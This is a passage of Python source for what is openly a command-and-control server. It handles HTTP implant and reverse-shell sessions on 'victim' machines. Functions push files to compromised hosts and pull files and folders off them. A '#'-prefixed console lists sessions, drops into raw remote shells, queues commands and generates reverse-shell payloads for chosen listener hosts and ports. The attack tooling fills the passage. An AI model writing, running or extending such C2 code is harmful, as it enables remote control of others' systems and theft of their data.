                shell_socket = shell_sessions[session_id]['socket']
                try:
                    shell_sessions[session_id]['last_sent'] = cmd
                    shell_socket.sendall((cmd + '\n').encode())
                    quiet_print(f"[+] Command sent to shell session {session_id}")
                    
                    # For shell sessions, we can't wait for completion, so clean up after a delay
                    if is_directory and 'compressed_file' in locals():
                        def delayed_cleanup():
                            import time
                            time.sleep(5)  # Wait 5 seconds for transfer to complete
                            try:
                                if os.path.exists(compressed_file):
                                    os.remove(compressed_file)
                                    quiet_print(f"[+] Cleaned up temp file: {os.path.basename(compressed_file)}")
                                    # Remove from download mappings
                                    with global_lock:
                                        if token in download_mappings:
                                            del download_mappings[token]
                            except Exception as e:
                                print(f"[!] Failed to clean up temp file: {e}")
                        
                        # Start cleanup in background thread
                        threading.Thread(target=delayed_cleanup, daemon=True).start()
                except Exception as e:
                    print(f"[!] Failed to send command to shell: {e}")
            else:
                print("[!] Shell session no longer active.")

    # Show success message
    if not verbose:
        if is_directory:
            quiet_print(f"[+] Directory '{dir_name}' sent successfully", always_show=True)
        else:
            quiet_print(f"[+] File '{os.path.basename(local_path)}' sent successfully", always_show=True)
    else:
        if is_directory:
            quiet_print(f"[+] Directory '{dir_name}' sent successfully", always_show=True)
        else:
            quiet_print(f"[+] File '{os.path.basename(local_path)}' sent successfully", always_show=True)
    
    # Reset file transfer mode
    set_file_transfer_mode(False)


def handle_file_receive_cli(filename, save_path=None, verbose=False):
    """Handle file receive command in CLI mode - no interactive prompts"""
    set_global_verbose(verbose)
    set_file_transfer_mode(True)
    quiet_print(f"[DEBUG] File transfer mode set to True, verbose={verbose}")  # Debug output
    if not current_session:
        print("[!] No session selected. Use 'list' and 'select <ID>' first.")
        return
    
    session_type, session_id = current_session
    
    # FIRST: Check if the target file/folder exists on victim's machine
    quiet_print(f"[*] Verifying target file/folder exists on victim: {filename}")
    exists, is_directory, error_msg = check_remote_file_exists(session_id, session_type, filename)
    
    if not exists:
        print(f"[!] {error_msg}")
        print("[!] File transfer cancelled.")
        # Reset file transfer mode before returning
        set_file_transfer_mode(False)
        return
    
    # Show what type of item we found
    if is_directory:
        quiet_print(f"[+] Target directory found on victim: {filename}")
    else:
        quiet_print(f"[+] Target file found on victim: {filename}")
    
    # Get file size from victim machine for progress tracking
    file_size = 0
    is_folder_detected = is_directory
    
    if session_type == 'http':
        with global_lock:
            if session_id not in http_sessions:
                print("[!] HTTP session not found.")
                return
            session = http_sessions[session_id]
            os_choice = session.get('os', 'Linux')
    else:
        with global_lock:
            if session_id not in shell_sessions:
                print("[!] Shell session not found.")
                return
            session = shell_sessions[session_id]
            os_choice = session.get('os', 'Linux')
    
    # Get file size command
    size_cmd = get_file_size_commands(filename, os_choice)
    quiet_print(f"[*] Getting file size from victim...")
    quiet_print(f"[DEBUG] OS detected: {os_choice}")
    quiet_print(f"[DEBUG] File: {filename}")
    quiet_print(f"[DEBUG] Size command: {size_cmd}")
    
    if session_type == 'http':
        # Send size command via HTTP
        with global_lock:
            http_sessions[session_id]['last_cmd'] = size_cmd
            http_sessions[session_id]['has_new_output'] = False
            http_sessions[session_id]['awaiting'] = True
        
        # Wait for response and extract size
        start_time = time.time()
        quiet_print(f"[DEBUG] Starting file size detection loop...")
        while time.time() - start_time < 10:  # 10 second timeout
            with global_lock:
                session = http_sessions.get(session_id)
                if session and session.get('has_new_output'):
                    output = session.get('output', '')
                    quiet_print(f"[DEBUG] Received output: {output[:200]}...")
                    # Handle different response formats based on OS
                    if 'FILE_SIZE:' in output or 'FOLDER_SIZE:' in output:
                        # Linux smart detection format
                        try:
                            # Check for folder size first (more specific)
                            if 'FOLDER_SIZE:' in output:
                                size_line = [line for line in output.split('\n') if 'FOLDER_SIZE:' in line][-1]
                                file_size = int(size_line.split('FOLDER_SIZE:')[1].strip())
                                is_folder_detected = True
                                quiet_print(f"[+] Detected as folder, size: {file_size} bytes")
                            elif 'FILE_SIZE:' in output:
                                size_line = [line for line in output.split('\n') if 'FILE_SIZE:' in line][-1]
                                file_size = int(size_line.split('FILE_SIZE:')[1].strip())
                                is_folder_detected = False
                                quiet_print(f"[+] Detected as file, size: {file_size} bytes")
                            quiet_print(f"[DEBUG] Extracted size: {file_size}")
                            break
                        except (ValueError, IndexError) as e:
                            quiet_print(f"[DEBUG] Error parsing size: {e}")
                            pass
            time.sleep(0.1)
            # Add progress indicator every 2 seconds
            if int(time.time() - start_time) % 2 == 0 and time.time() - start_time > 1:
                quiet_print(f"[DEBUG] Still waiting for file size response... ({int(time.time() - start_time)}s)")
        
        # Check if we timed out
        if time.time() - start_time >= 10:
            quiet_print(f"[DEBUG] File size detection timed out or failed")
            quiet_print(f"[DEBUG] Final file_size: {file_size}")
            quiet_print(f"[*] Proceeding with file transfer using Content-Length fallback")
    else:
        # Send size command via TCP shell
        output = shell_execute_and_get_output(session_id, size_cmd, timeout=4)
        
        # Handle different response formats based on OS
        if 'FILE_SIZE:' in output or 'FOLDER_SIZE:' in output:
            try:
                # Check for folder size first (more specific)
                if 'FOLDER_SIZE:' in output:
                    size_line = [line for line in output.split('\n') if 'FOLDER_SIZE:' in line][-1]
                    file_size = int(size_line.split('FOLDER_SIZE:')[1].strip())
                    is_folder_detected = True
                    quiet_print(f"[+] Detected as folder, size: {file_size} bytes")
                elif 'FILE_SIZE:' in output:
                    size_line = [line for line in output.split('\n') if 'FILE_SIZE:' in line][-1]
                    file_size = int(size_line.split('FILE_SIZE:')[1].strip())
                    is_folder_detected = False
                    quiet_print(f"[+] Detected as file, size: {file_size} bytes")
            except (ValueError, IndexError):
                quiet_print("[!] Failed to parse file size from shell response.")
    
    # Initialize progress tracking
    if file_size > 0:
        progress = FileTransferProgress(file_size, filename, "receive")
        set_progress_tracker(progress)
        # Display file size in appropriate unit (bytes, KB, or MB)
        if file_size < 1024:  # Less than 1KB
            size_display = f"{file_size}B"
        elif file_size < (1024 * 1024):  # Less than 1MB
            size_display = f"{file_size / 1024:.1f}KB"
        else:
            size_display = f"{file_size / (1024*1024):.1f}MB"
        # Show appropriate label based on detection
        if is_folder_detected:
            quiet_print(f"[*] Folder size: {size_display}")
        else:
            quiet_print(f"[*] File size: {size_display}")
    else:
        # Even if we can't get the file size, still initialize progress tracking
        # We'll update it with the actual content length when the HTTP request arrives
        quiet_print(f"[*] File size: Unknown (will be determined from HTTP Content-Length)")
        quiet_print(f"[DEBUG] File size detection failed, using Content-Length fallback")
        # Initialize with a dummy size, will be updated when we get the actual content length
        progress = FileTransferProgress(1, filename, "receive")  # Start with 1 byte to avoid division by zero
        set_progress_tracker(progress)
    
    # Show receive message before progress bar starts
    actual_save_path = save_path if save_path else "downloads"
    # Show appropriate receive message based on detection
    if is_folder_detected:
        quiet_print(f"[+] Folder '{filename}' will be received and saved to {actual_save_path}", always_show=True)
    else:
        quiet_print(f"[+] File '{filename}' will be received and saved to {actual_save_path}", always_show=True)
    
    if session_type == 'http':
        with global_lock:
            if session_id not in http_sessions:
                print("[!] HTTP session not found.")
                return
            session = http_sessions[session_id]
            cwd = session.get('cwd')
            if not cwd:
                # Auto-detect CWD on victim by sending an explicit CWD marker command
                # Try Windows-style first; if session OS is known, prefer it
                sess_os = session.get('os')
                if sess_os == 'Windows':
                    discover_cmd = "powershell -c \"Write-Output 'CWD:' + (Get-Location).Path\""
                elif sess_os == 'Linux':
                    discover_cmd = "pwd | sed 's/^/CWD:/'"
                else:
                    # Unknown: try Windows marker first to avoid sed error in PS, then fallback
                    discover_cmd = "powershell -c \"Write-Output 'CWD:' + (Get-Location).Path\""
                http_sessions[session_id]['last_cmd'] = discover_cmd
                http_sessions[session_id]['has_new_output'] = False
                http_sessions[session_id]['awaiting'] = True
        if session_type == 'http' and not cwd:
            quiet_print("[*] Detecting victim current directory...")
            wait_for_http_response(session_id, 8)
            with global_lock:
                if session_id in http_sessions:
                    cwd = http_sessions[session_id].get('cwd')
        if session_type == 'http' and not cwd:
            # Fallback: send plain OS-specific command to trigger heuristic parser
            session = http_sessions.get(session_id, {})
            sess_os = session.get('os')
            if sess_os == 'Windows':
                fallback_cmd = "Get-Location"
            elif sess_os == 'Linux':
                fallback_cmd = "pwd"
            else:
                # Unknown: try Windows first, then we'll try POSIX if still unknown
                fallback_cmd = "Get-Location"
            with global_lock:
                if session_id in http_sessions:
                    http_sessions[session_id]['last_cmd'] = fallback_cmd
                    http_sessions[session_id]['has_new_output'] = False
                    http_sessions[session_id]['awaiting'] = True
            wait_for_http_response(session_id, 5)
            with global_lock:
                if session_id in http_sessions:
                    cwd = http_sessions[session_id].get('cwd')
        if session_type == 'http' and not cwd:
            # Final fallback: try POSIX
            with global_lock:
                if session_id in http_sessions:
                    http_sessions[session_id]['last_cmd'] = "pwd"
                    http_sessions[session_id]['has_new_output'] = False
                    http_sessions[session_id]['awaiting'] = True
            wait_for_http_response(session_id, 5)
            with global_lock:
                if session_id in http_sessions:
                    cwd = http_sessions[session_id].get('cwd')
        if session_type == 'http' and cwd:
            # Lock in OS after discovery
            with global_lock:
                if session_id in http_sessions and not http_sessions[session_id].get('os'):
                    if re.match(r'^[A-Za-z]:[\\/]', cwd) or ('\\' in cwd and not cwd.startswith('/')):
                        http_sessions[session_id]['os'] = 'Windows'
                    elif cwd.startswith('/'):
                        http_sessions[session_id]['os'] = 'Linux'
        if session_type == 'http' and not cwd:
            print("[!] Could not determine victim current directory automatically.")
            return
    elif session_type == 'shell':
        with global_lock:
            if session_id not in shell_sessions:
                print("[!] Shell session not found.")
                return
            sess_os = shell_sessions[session_id].get('os')

        # Always resync CWD at the start of transfer for TCP shells
        quiet_print("[*] Detecting victim OS and current directory...")
        
        # Determine detection command
        if sess_os == 'Windows':
            detect_cmd = (
                "powershell -NoProfile -NonInteractive -Command "
                "$ErrorActionPreference='SilentlyContinue';"
                "Write-Output ('CWD:' + (Get-Location).Path)"
            )
        else:
            detect_cmd = r'printf "CWD:%s\n" "$PWD" 2>/dev/null || echo "CWD:$(pwd)"'
            
        # Execute and parse
        output = shell_execute_and_get_output(session_id, detect_cmd, timeout=3)
        
        # Parse output for CWD
        new_cwd = None
        if 'CWD:' in output:
            try:
                marker_lines = [ln for ln in output.splitlines() if 'CWD:' in ln]
                if marker_lines:
                    new_cwd = marker_lines[-1].split(':', 1)[1].strip()
            except Exception:
                pass
        
        if not new_cwd and output.strip():
            # Fallback: if output is a path-like string
            lines = [ln for ln in output.splitlines() if ln.strip()]
            if lines:
                cand = lines[-1].strip()
                cand = re.sub(r'^[\$#>\s]*', '', cand)
                if cand.startswith('/') or re.match(r'^[A-Za-z]:[\\/]', cand):
                    new_cwd = cand
        
        if new_cwd:
            cwd = new_cwd
            with global_lock:
                if session_id in shell_sessions:
                    shell_sessions[session_id]['cwd'] = cwd
            quiet_print(f"[*] Detected CWD: {cwd}")
        else:
            quiet_print("[!] Automatic CWD detection failed, using last known or fallback.")
            with global_lock:
                cwd = shell_sessions.get(session_id, {}).get('cwd')
            
            if not cwd:
                cwd = "/tmp"  # Generic fallback
                quiet_print(f"[*] Using fallback CWD: {cwd}")
    else:
        print("[!] Unknown session type.")
        return
    
    quiet_print(f"\n[+] Receiving file from victim...")
    quiet_print(f"[*] Victim's current directory: {cwd}")
    
    if session_type == 'http':
        # First, list files in victim's current directory
        # Detect Windows vs POSIX based on cwd to avoid wrong flags in PowerShell
        sess = http_sessions.get(session_id, {})
        sess_os = sess.get('os')
        if sess_os == 'Windows':
            list_cmd = "dir"
        elif sess_os == 'Linux':
            list_cmd = "ls -la"
        else:
            is_windows_cwd = bool(re.match(r'^[A-Za-z]:[\\/]', cwd)) or ('\\' in cwd and not cwd.startswith('/'))
            list_cmd = "dir" if is_windows_cwd else "ls -la"
        with global_lock:
            http_sessions[session_id]['last_cmd'] = list_cmd
            http_sessions[session_id]['has_new_output'] = False
            http_sessions[session_id]['awaiting'] = True
        
        quiet_print(f"[*] Listing files in victim's directory...")
        wait_for_http_response(session_id, 10)
        
        # Capture the directory listing output immediately after waiting
        directory_listing_output = ""
        with global_lock:
            if session_id in http_sessions:
                directory_listing_output = http_sessions[session_id].get('output', '')
        
        # Use provided filename instead of asking for input
        victim_file = filename.strip()
    else:  # shell session
        # For shell sessions, also list files automatically like HTTP
        with global_lock:
            sess = shell_sessions.get(session_id, {})
            sess_os = sess.get('os')
        if sess_os == 'Windows':
            list_cmd = "dir"
        elif sess_os == 'Linux':
            list_cmd = "ls -la"
        else:
            # Fallback based on cwd shape
            is_windows_cwd = bool(re.match(r'^[A-Za-z]:[\\/]', cwd)) or ('\\' in cwd and not cwd.startswith('/'))
            list_cmd = "dir" if is_windows_cwd else "ls -la"
        quiet_print(f"[*] Listing files in victim's directory...")
        
        # Capture listing output using helper
        directory_listing_output = shell_execute_and_get_output(session_id, list_cmd, timeout=3)
        victim_file = filename.strip()
    
    if not victim_file:
        print("[!] Filename cannot be empty.")
        return
    
    # Build full path using current directory + filename
    if cwd.endswith('/') or cwd.endswith('\\'):
        full_victim_path = cwd + victim_file
    else:
        sep = '\\' if ('\\' in cwd or re.match(r'^[A-Za-z]:', cwd)) else '/'
        full_victim_path = cwd + sep + victim_file
    
    # Determine effective OS first (needed for directory detection)
    sess_os = None
    if session_type == 'http':
        with global_lock:
            sess = http_sessions.get(session_id, {})
            sess_os = sess.get('os')
    else:
        with global_lock:
            sess = shell_sessions.get(session_id, {})
            sess_os = sess.get('os')

    # Heuristic from cwd if session OS unknown
    inferred_os = None
    try:
        if cwd:
            if re.match(r'^[A-Za-z]:[\\/]', cwd) or ('\\' in cwd and not cwd.startswith('/')):
                inferred_os = 'Windows'
            elif cwd.startswith('/'):
                inferred_os = 'Linux'
    except Exception:
        inferred_os = None

    # Prefer session OS, then inferred from cwd, then default to Linux
    effective_os = sess_os or inferred_os or 'Linux'
    
    # Detect if it's a directory based on the listing output
    # Check if the file entry starts with 'd' (directory) in ls -la output
    # or if it's listed as a directory in Windows dir output
    is_directory = False
    if session_type == 'http':
        # Use the captured directory listing output
        output = directory_listing_output
        quiet_print(f"[DEBUG] HTTP output for directory detection: {repr(output)}")  # Debug output
        # Look for directory indicators in the output
        lines = output.split('\n')
        for line in lines:
            if victim_file in line:
                quiet_print(f"[DEBUG] Found matching line: {repr(line)}")  # Debug output
                # Check if line starts with 'd' (Linux) or contains '<DIR>' (Windows)
                if line.strip().startswith('d') or '<DIR>' in line:
                    is_directory = True
                    quiet_print(f"[DEBUG] Detected as directory!")  # Debug output
                    break
    else:  # shell session
        # For shell sessions, send a command to check if it's a directory
        quiet_print(f"[*] Checking if '{victim_file}' is a directory...")
        if effective_os == 'Windows':
            check_cmd = f"if (Test-Path '{full_victim_path}' -PathType Container) {{ Write-Output 'IS_DIRECTORY' }} else {{ Write-Output 'IS_FILE' }}"
        else:
            check_cmd = f"if [ -d '{full_victim_path}' ]; then echo 'IS_DIRECTORY'; else echo 'IS_FILE'; fi"
        
        output = shell_execute_and_get_output(session_id, check_cmd, timeout=3)
        
        if 'IS_DIRECTORY' in output:
            is_directory = True
            quiet_print(f"[+] Detected '{victim_file}' as a directory")
        else:
            is_directory = False
            quiet_print(f"[+] Detected '{victim_file}' as a file")
    
        quiet_print(f"[DEBUG] Final is_directory decision: {is_directory}")  # Debug output
    
    # Use provided save path or default to DOWNLOAD_DIR
    if save_path:
        chosen_dir = os.path.expanduser(save_path)
    else:
        chosen_dir = DOWNLOAD_DIR
    
    quiet_print(f"[*] Save directory: {chosen_dir}")
    
    # Determine save name - always use original filename for directories
    # The compression/extraction will be handled automatically
    save_name = victim_file
    
    full_save_path = os.path.join(chosen_dir, save_name)
    
    # Create directory if it doesn't exist
    os.makedirs(os.path.dirname(full_save_path), exist_ok=True)
    
    # Generate and send command
    cmd = generate_file_transfer_commands("receive", effective_os, full_victim_path, save_name, is_directory)
    quiet_print(f"\n[+] Sending command to victim...")
    quiet_print(f"[*] Command: {cmd}")
    quiet_print(f"[*] Will save to: {full_save_path}")
    
    if session_type == 'http':
        # Store the custom save path for the upload handler
        with global_lock:
            current_time = time.time()
            http_sessions[session_id]['custom_save_path'] = full_save_path
            http_sessions[session_id]['last_cmd'] = cmd
            http_sessions[session_id]['last_sent'] = cmd
            http_sessions[session_id]['last_sent_time'] = current_time
            http_sessions[session_id]['command_sent_time'] = current_time
            http_sessions[session_id]['has_new_output'] = False
            http_sessions[session_id]['awaiting'] = True
            http_sessions[session_id]['state'] = "file_transfer"
            http_sessions[session_id]['last_activity'] = current_time
        
        # Start progress bar AFTER all verbose messages are displayed
        progress = get_progress_tracker()
        if progress:
            progress.display_progress(force_show=True)
            
            # Start a background thread for smooth progress updates
            def background_progress_update():
                import time
                while progress and not progress.completed:
                    time.sleep(0.5)  # Update every 500ms for smooth display
                    if progress and not progress.completed:
                        progress.display_progress()
            
            import threading
            progress_thread = threading.Thread(target=background_progress_update, daemon=True)
            progress_thread.start()
        
        wait_for_http_response(session_id)  # Use dynamic timeout for file transfer
    else:  # shell session
        # For TCP shells, prepare pending save path so HTTP upload handler can place file correctly
        with global_lock:
            global pending_upload_save_path
            pending_upload_save_path = full_save_path
        # For shell sessions, send the command directly
        with global_lock:
            if session_id in shell_sessions:
                shell_socket = shell_sessions[session_id]['socket']
                try:
                    shell_sessions[session_id]['last_sent'] = cmd
                    shell_socket.sendall((cmd + '\n').encode())
                    quiet_print(f"[+] Command sent to shell session {session_id}")
                except Exception as e:
                    print(f"[!] Failed to send command to shell: {e}")
            else:
                print("[!] Shell session no longer active.")
        
        # Start progress display for shell sessions
        progress = get_progress_tracker()
        if progress:
            progress.display_progress(force_show=True)
            
            # Start a background thread for smooth progress updates
            def background_progress_update():
                import time
                while progress and not progress.completed:
                    time.sleep(0.5)  # Update every 500ms for smooth display
                    if progress and not progress.completed:
                        progress.display_progress()
            
            import threading
            progress_thread = threading.Thread(target=background_progress_update, daemon=True)
            progress_thread.start()
    
    # Success message is now shown before progress bar starts
    
    # Reset file transfer mode
    set_file_transfer_mode(False)


def process_c2_command(cmd_input):
    """Process a C2 command starting with #. Returns True if handled, False otherwise."""
    global current_session, line_mode_shell_id, GLOBAL_LIST_MAP
    
    # Strip whitespace and clean ANSI escape sequences that might be captured in raw mode
    cmd_input = strip_ansi(cmd_input.strip())
    if not cmd_input or not cmd_input.startswith('#'):
        return False
        
    quiet_print(f"[DEBUG] Processing C2 command: '{cmd_input}'")
    c2_cmd = cmd_input[1:].strip()
    
    if c2_cmd.lower() in ('help', '?'):
        print("C2 Commands (use # prefix):\n"
              "  #list          - List all active sessions (HTTP and Shells).\n"
              "  #select <ID>   - Select a session (Line Mode/HTTP).\n"
              "  #shell <ID>    - Enter interactive raw shell (Tab, arrows, Ctrl-C support).\n"
              "  #send <path> [-v] - Send file/folder to victim (CLI mode).\n"
              "  #receive <file> [-s=<path>] [-v] - Receive file from victim (CLI mode).\n"
              "  #testfile <file> - Test if file exists on victim (debug command).\n"
              "  #cleanup       - Clean up temporary UUID files in /tmp directory.\n"
              "  #status <ID>   - Show detailed session status and stability information.\n"
              "  #repair <ID> <type> <value> - Repair session metadata (hostname, username, cwd, os).\n"
              "  #queue <ID>    - Show queued commands for a session.\n"
              "  #stability     - Show stability scores for all sessions.\n"
              "  #back          - Return to main C2 prompt (keep current session active).\n"
              "  #generate <flags> - Generate/store a new payload (e.g., -os=w -con=http -lhost=10.0.0.1 -lport=4444).\n"
              "  #exit          - Exit session (if in one) OR shutdown C2 server.\n"
              "  <any other>    - Command to send to the selected session.\n\n"
              "File Transfer Examples:\n"
              "  #send /home/user/file.txt\n"
              "  #send /home/user/folder -v\n"
              "  #receive file.txt\n"
              "  #receive file.txt -s=/custom/save/path -v\n\n"
              "Options:\n"
              "  -v             - Verbose mode (shows detailed transfer information)\n"
              "  -s=<path>      - Custom save path for receive command")
        return True

    if c2_cmd.lower() == "list":
        GLOBAL_LIST_MAP.clear()
        i = 1
        print("\n--- Active Sessions ---")
        max_uid_length = 0
        with global_lock:
            for uid in http_sessions.keys():
                max_uid_length = max(max_uid_length, len(uid))
            for shell_id in shell_sessions.keys():
                max_uid_length = max(max_uid_length, len(shell_id))
        target_width = max(max_uid_length + 2, 20)
        print(f"ID  Type   {'Target':<{target_width}} OS       User           Status    Stability  Last Seen/Info")
        print(f"--  ----   {'-' * target_width}  -------  -------------  --------  ---------  -----------------")
        with global_lock:
            for uid, data in http_sessions.items():
                delta = int(time.time() - data["last_seen"])
                os_name = data.get('os') or '-'
                user_name = data.get('username') or '-'
                # Truncate user name if too long
                if len(user_name) > 13:
                    user_name = user_name[:12] + '+'
                status = data.get('status', 'unknown')
                stability = data.get('stability_score', 0.0)
                stability_str = f"{stability:.2f}"
                
                # Add detection status indicator
                detection_done = data.get('detection_complete', False)
                status_indicator = '' if detection_done else ' [detecting...]'
                
                print(f"{i:<3} HTTP   {uid:<{target_width}} {os_name:<7} {user_name:<14} {status:<8} {stability_str:<9} {delta}s ago{status_indicator}")
                GLOBAL_LIST_MAP[i] = ('http', uid)
                i += 1
            for shell_id, data in shell_sessions.items():
                addr_str = f"{data['address'][0]}:{data['address'][1]}"
                os_name = data.get('os') or '-'
                user_name = data.get('username') or '-'
                if len(user_name) > 13:
                    user_name = user_name[:12] + '+'
                
                # Add detection status indicator
                detection_done = data.get('detection_complete', False)
                status_indicator = '' if detection_done else ' [detecting...]'
                
                print(f"{i:<3} SHELL  {shell_id:<{target_width}} {os_name:<7} {user_name:<14} {'stable':<8} {'1.00':<9} {addr_str}{status_indicator}")
                GLOBAL_LIST_MAP[i] = ('shell', shell_id)
                i += 1
        if not GLOBAL_LIST_MAP:
            print("[!] No active sessions.")
        print()
        return True

    if c2_cmd.lower().startswith("select "):
        try:
            parts = c2_cmd.split(maxsplit=1)
            if len(parts) < 2:
                print("[!] Usage: #select <ID>")
                return True
            selection_id = int(parts[1])
            if selection_id in GLOBAL_LIST_MAP:
                session_type, session_id = GLOBAL_LIST_MAP[selection_id]
                
                # Check if detection is complete for shell sessions
                if session_type == 'shell':
                    with global_lock:
                        detection_done = shell_sessions.get(session_id, {}).get('detection_complete', False)
                    
                    if not detection_done:
                        print("[*] Waiting for session detection to complete...")
                        # Wait up to 5 seconds for detection
                        for _ in range(10):
                            time.sleep(0.5)
                            with global_lock:
                                detection_done = shell_sessions.get(session_id, {}).get('detection_complete', False)
                            if detection_done:
                                break
                        
                        if not detection_done:
                            print("[!] Warning: Detection still in progress. Session may not be fully initialized.")
                    
                    enter_shell_session(session_id)
                
                elif session_type == 'http':
                    # Check detection for HTTP sessions too
                    with global_lock:
                        detection_done = http_sessions.get(session_id, {}).get('detection_complete', False)
                    
                    if not detection_done:
                        print("[*] Waiting for session detection to complete...")
                        for _ in range(10):
                            time.sleep(0.5)
                            with global_lock:
                                detection_done = http_sessions.get(session_id, {}).get('detection_complete', False)
                            if detection_done:
                                break
                        
                        if not detection_done:
                            print("[!] Warning: Detection still in progress. Session may not be fully initialized.")
                    
                    with global_lock:
                        current_session = ('http', session_id)
                    print(f"[+] Selected implant {session_id}")
            else:
                print("[!] Invalid selection ID.")
        except (ValueError, IndexError):
            print("[!] Invalid format. Use '#select <ID>' from the '#list' command.")
        return True

    if c2_cmd.lower().startswith("shell "):
        try:
            parts = c2_cmd.split(maxsplit=1)
            if len(parts) < 2:
                print("[!] Usage: #shell <ID>")
                return True
            selection_id = int(parts[1])
            if selection_id in GLOBAL_LIST_MAP:
                session_type, session_id = GLOBAL_LIST_MAP[selection_id]
                if session_type == 'shell':
                    # Check if detection is complete
                    with global_lock:
                        detection_done = shell_sessions.get(session_id, {}).get('detection_complete', False)
                    
                    if not detection_done:
                        print("[*] Waiting for session detection to complete...")
                        for _ in range(10):
                            time.sleep(0.5)
                            with global_lock:
                                detection_done = shell_sessions.get(session_id, {}).get('detection_complete', False)
                            if detection_done:
                                break
                        
                        if not detection_done:
                            print("[!] Warning: Detection still in progress. Session may not be fully initialized.")
                    
                    try:
                        interactive_shell_session(session_id)
                    except Exception as e:
                        print(f"[!] Error entering raw session: {e}")
                        print("[*] Falling back to line mode.")
                        enter_shell_session(session_id)
                else:
                    print("[!] Raw interaction is only supported for SHELL sessions.")
            else:
                print("[!] Invalid selection ID.")
        except (ValueError, IndexError):
            print("[!] Invalid format. Use '#shell <ID>' from the '#list' command.")
        return True

    if c2_cmd.lower().startswith("send"):
        parts = parse_quoted_args(c2_cmd)
        if len(parts) < 2:
            print("[!] Usage: #send <file_or_folder_path> [-v]")
            return True
        file_path = parts[1]
        verbose = '-v' in parts[2:]
        handle_file_send_cli(file_path, verbose)
        return True

    if c2_cmd.lower().startswith("testfile"):
        parts = parse_quoted_args(c2_cmd)
        if len(parts) < 2:
            print("[!] Usage: #testfile <filename>")
            return True
        if not current_session:
            print("[!] No session selected. Use '#list' and '#select <ID>' first.")
            return True
        filename = parts[1]
        session_type, session_id = current_session
        print(f"[*] Testing if '{filename}' exists on victim...")
        exists, is_directory, error_msg = check_remote_file_exists(session_id, session_type, filename)
        if exists:
            if is_directory:
                print(f"[+] ✓ Directory '{filename}' exists on victim")
            else:
                print(f"[+] ✓ File '{filename}' exists on victim")
        else:
            print(f"[!] ✗ {error_msg}")
        return True

    if c2_cmd.lower().startswith("receive"):
        parts = parse_quoted_args(c2_cmd)
        if len(parts) < 2:
            print("[!] Usage: #receive <filename> [-s=<save_path>] [-v]")
            return True
        filename = parts[1]
        save_path = None
        verbose = False
        for part in parts[2:]:
            if part.startswith('-s='):
                save_path = part[3:]
            elif part == '-v':
                verbose = True
        handle_file_receive_cli(filename, save_path, verbose)
        return True

    if c2_cmd.lower() == "cleanup":
        cleanup_temp_files()
        cleanup_orphaned_download_mappings()
        return True

    if c2_cmd.lower().startswith("status"):
        parts = c2_cmd.split()
        if len(parts) < 2:
            print("[!] Usage: #status <session_id>")
            return True
        session_id = parts[1]
        status = get_session_status(session_id)
        if status:
            print(f"\n--- Session Status: {session_id} ---")
            print(f"Type: {status['type']}")
            print(f"Status: {status['status']}")
            print(f"Stability: {status['stability']:.2f}")
            print(f"State: {status['state']}")
            print(f"Last Seen: {time.time() - status['last_seen']:.1f}s ago")
            print(f"Last Activity: {time.time() - status['last_activity']:.1f}s ago")
            print(f"Successful Commands: {status['successful_commands']}")
            print(f"Total Commands: {status['total_commands']}")
            print(f"Consecutive Failures: {status['consecutive_failures']}")
            print(f"Queued Commands: {status['queued_commands']}")
            print(f"Dynamic Timeout: {status['timeout']}s")
        else:
            print(f"[!] Session {session_id} not found.")
        return True

    if c2_cmd.lower().startswith("repair"):
        parts = c2_cmd.split()
        if len(parts) < 4:
            print("[!] Usage: #repair <session_id> <type> <value>")
            return True
        session_id, repair_type, value = parts[1], parts[2], " ".join(parts[3:])
        if repair_session(session_id, repair_type, value):
            print(f"[+] Session {session_id} repaired: {repair_type} = {value}")
        else:
            print(f"[!] Failed to repair session {session_id}")
        return True

    if c2_cmd.lower().startswith("queue"):
        parts = c2_cmd.split()
        if len(parts) < 2:
            print("[!] Usage: #queue <session_id>")
            return True
        session_id = parts[1]
        if session_id in http_sessions:
            queue = http_sessions[session_id].get("command_queue", [])
            if queue:
                print(f"\n--- Queued Commands for {session_id} (HTTP) ---")
                for i, cmd in enumerate(queue):
                    print(f"{i+1}. {cmd['command']} (retries: {cmd['retries']})")
            else:
                print(f"[+] No queued commands for session {session_id}")
        elif session_id in shell_sessions:
            print(f"[+] Shell sessions do not use command queuing - commands are sent directly.")
        else:
            print(f"[!] Session {session_id} not found.")
        return True

    if c2_cmd.lower() == "stability":
        print("\n--- Session Stability Overview ---")
        has_sessions = False
        if http_sessions:
            has_sessions = True
            print("HTTP Sessions:")
            for uid, session in http_sessions.items():
                stability = calculate_session_stability(session)
                status = session.get("status", "unknown")
                print(f"  {uid}: {status} (stability: {stability:.2f})")
        if shell_sessions:
            has_sessions = True
            print("Shell Sessions:")
            for shell_id, session in shell_sessions.items():
                print(f"  {shell_id}: stable (stability: 1.00)")
        if not has_sessions:
            print("[+] No active sessions.")
        return True

    if c2_cmd.lower() == "back":
        if current_session:
            print(f"[*] Returning to main console. Session {current_session[1]} is still active.")
            current_session = None
            line_mode_shell_id = None
        else:
            print("[!] Not currently in a session.")
        return True

    if c2_cmd.lower().startswith("generate"):
        from argparse import ArgumentParser
        gen_parser = ArgumentParser(prog="#generate", add_help=False)
        gen_parser.add_argument("-m", "--mode", default="b")
        gen_parser.add_argument("-os", "--os", dest="os_flag")
        gen_parser.add_argument("-con", "--connection", dest="connection")
        gen_parser.add_argument("-lhost", dest="lhost")
        gen_parser.add_argument("-lport", dest="lport", type=int)
        gen_parser.add_argument("-n", "--name", dest="name")
        gen_parser.add_argument("-pay", "--payload", dest="payload")
        gen_parser.add_argument("-cry", "--crypto", dest="crypto")
        
        try:
            # Skip the 'generate' word and split the rest
            cmd_parts = parse_quoted_args(cmd_input)[1:]
            gen_args, unknown = gen_parser.parse_known_args(cmd_parts)
            
            if not gen_args.os_flag:
                print("[!] -os is required (w or l).")
                return True
                
            os_choice = normalize_os_choice(gen_args.os_flag)
            if not os_choice:
                print("[!] Invalid -os. Use w or l.")
                return True

            mode = gen_args.mode.lower()
            if mode == 'c':
                # Create/store
                connection = normalize_connection(gen_args.connection)
                if not connection or not gen_args.name or not gen_args.payload:
                    print("[!] In create mode, -con, -n, and -pay are required.")
                    return True
                
                raw = read_payload_source(gen_args.payload)
                ex_host, ex_port = extract_host_port(raw)
                if not ex_host or not ex_port:
                    print("[!] Could not auto-detect LHOST/LPORT from content.")
                    return True
                
                templated = template_payload_content(raw, ex_host, ex_port)
                save_custom_payload(os_choice, gen_args.name, templated, connection)
                print(f"[+] Stored payload '{gen_args.name}' for {os_choice} ({connection}).")
            else:
                # Generate/Show
                connection = normalize_connection(gen_args.connection)
                if not connection or not gen_args.lhost or not gen_args.lport:
